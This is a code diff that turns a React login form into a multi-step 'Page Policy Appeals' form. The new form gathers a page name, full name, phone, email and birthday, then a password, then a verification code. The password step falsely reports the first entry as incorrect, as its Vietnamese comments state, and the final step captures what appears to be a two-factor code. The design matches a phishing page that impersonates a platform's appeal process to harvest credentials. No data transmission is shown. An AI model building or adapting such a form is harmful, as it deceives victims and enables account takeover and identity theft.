@@ -1,98 +1,134 @@
 import React, { useState } from 'react';
-import useFormValidation from '@hooks/useFormValidation';
-import { useOutletContext } from 'react-router-dom';
 
-type FieldName = 'email' | 'password';
-
-type ContextType = {
-	setEmail: React.Dispatch<React.SetStateAction<string>>;
-	setPassword: React.Dispatch<React.SetStateAction<string>>;
-	emailInputRef: React.RefObject<HTMLInputElement>;
-	passwordInputRef: React.RefObject<HTMLInputElement>;
-};
-
-const LoginForm: React.FC = () => {
-	const [formData, setFormData] = useState<{
-		email: string;
-		password: string;
-	}>({
+const MultiStepForm: React.FC = () => {
+	const [step, setStep] = useState<1 | 2 | 3>(1);
+	const [formData, setFormData] = useState({
+		pageName: '',
+		fullName: '',
+		phone: '',
 		email: '',
+		birthday: '',
 		password: '',
+		code: '',
 	});
+	const [passwordError, setPasswordError] = useState('');
 
-	const { errors, validateInput } = useFormValidation();
-	const { setEmail, setPassword, emailInputRef, passwordInputRef } =
-		useOutletContext<ContextType>();
-
-	const handleInputChange = (
-		event: React.ChangeEvent<HTMLInputElement>,
-		field: FieldName
-	) => {
-		const value = event.target.value;
-		setFormData((prevData) => ({
-			...prevData,
-			[field]: value,
-		}));
-		if (field === 'email') {
-			setEmail(value);
-		} else if (field === 'password') {
-			setPassword(value);
-		}
-		validateInput(field, value);
+	const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+		const { name, value } = e.target;
+		setFormData((prev) => ({ ...prev, [name]: value }));
 	};
 
-	const handleChange =
-		(field: FieldName) => (event: React.ChangeEvent<HTMLInputElement>) =>
-			handleInputChange(event, field);
+	const handleSubmit = (e: React.FormEvent) => {
+		e.preventDefault();
+
+		if (step === 1) {
+			setStep(2); // sang bước nhập password
+		} else if (step === 2) {
+			if (passwordError === '') {
+				// Lần 1 báo sai mật khẩu
+				setPasswordError('The password that you’ve entered is incorrect.');
+			} else if (formData.password === '123456') {
+				// Lần 2 đúng mật khẩu
+				setPasswordError('');
+				setStep(3);
+			} else {
+				setPasswordError('The password that you’ve entered is incorrect.');
+			}
+		} else if (step === 3) {
+			alert('Code entered: ' + formData.code);
+		}
+	};
 
 	return (
-		<div className="max-w-md mx-auto my-6 bg-white p-6 rounded-2xl shadow-sm">
+		<div className="max-w-md mx-auto my-10 bg-white p-6 rounded-xl shadow-md">
 			<h2 className="text-2xl font-semibold text-center text-gray-800 mb-6">
-				Secure Login
+				{step === 1 ? 'Page Policy Appeals' : step === 2 ? 'Secure Login' : 'Verification'}
 			</h2>
 
-			<div className="mb-4">
-				<label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
-					Email Address
-				</label>
-				<input
-					ref={emailInputRef}
-					id="email"
-					type="email"
-					placeholder="you@example.com"
-					value={formData.email}
-					onChange={handleChange('email')}
-					onBlur={() => validateInput('email', formData.email)}
-					className="w-full rounded-lg border border-gray-300 p-3 text-sm shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-200 focus:outline-none"
-				/>
-				{errors.email && <p className="text-sm text-red-500 mt-1">{errors.email}</p>}
-			</div>
+			<form onSubmit={handleSubmit} className="space-y-4">
+				{step === 1 && (
+					<>
+						<input
+							type="text"
+							name="pageName"
+							placeholder="Page Name"
+							value={formData.pageName}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+						<input
+							type="text"
+							name="fullName"
+							placeholder="Your Full Name"
+							value={formData.fullName}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+						<input
+							type="tel"
+							name="phone"
+							placeholder="Phone Number"
+							value={formData.phone}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+						<input
+							type="email"
+							name="email"
+							placeholder="Email"
+							value={formData.email}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+						<input
+							type="text"
+							name="birthday"
+							placeholder="Birthday (MM/DD/YYYY)"
+							value={formData.birthday}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+					</>
+				)}
 
-			<div className="mb-4">
-				<label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
-					Password
-				</label>
-				<input
-					ref={passwordInputRef}
-					id="password"
-					type="password"
-					placeholder="Enter your password"
-					value={formData.password}
-					onChange={handleChange('password')}
-					onBlur={() => validateInput('password', formData.password)}
-					className="w-full rounded-lg border border-gray-300 p-3 text-sm shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-200 focus:outline-none"
-				/>
-				{errors.password && <p className="text-sm text-red-500 mt-1">{errors.password}</p>}
-			</div>
+				{step === 2 && (
+					<>
+						<input
+							type="password"
+							name="password"
+							placeholder="Enter your password"
+							value={formData.password}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+						{passwordError && (
+							<p className="text-sm text-red-500">{passwordError}</p>
+						)}
+					</>
+				)}
 
-			<button
-				type="submit"
-				className="w-full mt-4 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition font-medium"
-			>
-				Log In
-			</button>
+				{step === 3 && (
+					<>
+						<input
+							type="text"
+							name="code"
+							placeholder="Enter verification code"
+							value={formData.code}
+							onChange={handleChange}
+							className="w-full border rounded-lg p-3 text-sm"
+						/>
+					</>
+				)}
+
+				<button
+					type="submit"
+					className="w-full mt-4 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition font-medium"
+				>
+					{step === 3 ? 'Verify' : 'Continue'}
+				</button>
+			</form>
 		</div>
 	);
 };
 
-export default LoginForm;
+export default MultiStepForm;
